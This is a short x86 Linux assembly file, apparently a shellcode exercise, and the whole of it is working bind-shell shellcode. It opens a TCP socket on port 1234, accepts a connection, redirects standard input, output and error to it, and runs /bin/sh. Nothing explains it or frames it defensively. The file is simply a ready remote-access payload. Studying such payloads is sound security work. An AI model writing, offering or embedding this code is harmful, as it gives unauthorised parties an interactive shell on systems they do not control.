global _start

section .text
_start:
	
    mov eax,0
    mov ebx,0
    mov ecx,0
	mov al, 0x66
	mov bl, 0x1
	push ecx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80
	mov edi, eax
	mov al, 0x66
	pop ebx	
	xor edx, edx
	push edx
	push word 0xd204  ;puerto 1234
	push bx			
	mov ecx, esp	
	push 0x10		
	push ecx		
	push edi		
	mov ecx, esp	
	int 0x80		
	xor eax, eax	
	push eax		
	push edi		
	mov ecx, esp	
	inc ebx			
	inc ebx			
	mov al, 0x66	
	int 0x80		
	xor edx, edx	
	push edx		
	push edx		
	push edi		
	inc ebx			
	mov ecx, esp	
	mov al, 0x66	
	int 0x80		
	xchg ebx, eax	
	xor ecx, ecx	
	mov cl, 0x2 
loop:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns loop
	
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov ecx, edx
	mov al, 0xb	;execve
	int 0x80


